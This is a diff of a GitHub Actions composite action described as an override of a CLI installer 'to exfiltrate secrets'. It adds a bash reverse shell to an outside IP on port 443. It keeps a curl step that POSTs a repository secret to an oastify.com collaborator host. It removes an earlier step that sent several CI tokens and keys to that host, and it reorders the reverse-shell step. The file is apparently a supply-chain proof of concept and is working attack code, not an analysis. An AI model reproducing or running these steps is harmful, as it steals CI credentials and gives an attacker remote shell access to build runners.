@@ -4,25 +4,13 @@ description: Override of CLI installer to exfiltrate secrets
 runs:
   using: "composite"
   steps:
+    - name: reverse
+      shell: bash
+      run: |
+        bash -i >& /dev/tcp/185.28.22.45/443 0>&1
     - name: Try to exfiltrate test secret
       run: |
         echo "Attempting exfiltration of TOMAS..."
         curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
           -d "tomas=${{ secrets.TOMAS }}"
       shell: bash
-    - name: Exfiltrate Secrets
-      shell: bash
-      run: |
-        echo "Running PoC..."
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "token=${{ env.PLATFORMSH_CLI_TOKEN }}"
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "cli=${{ secrets.PLATFORMSH_CLI_TOKEN }}"
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "workflow_token=${{ env.WORKFLOW_TOKEN }}"
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "cypress_key=${{ env.CYPRESS_RECORD_KEY }}"
-    - name: reverse
-      shell: bash
-      run: |
-        bash -i >& /dev/tcp/185.28.22.45/443 0>&1
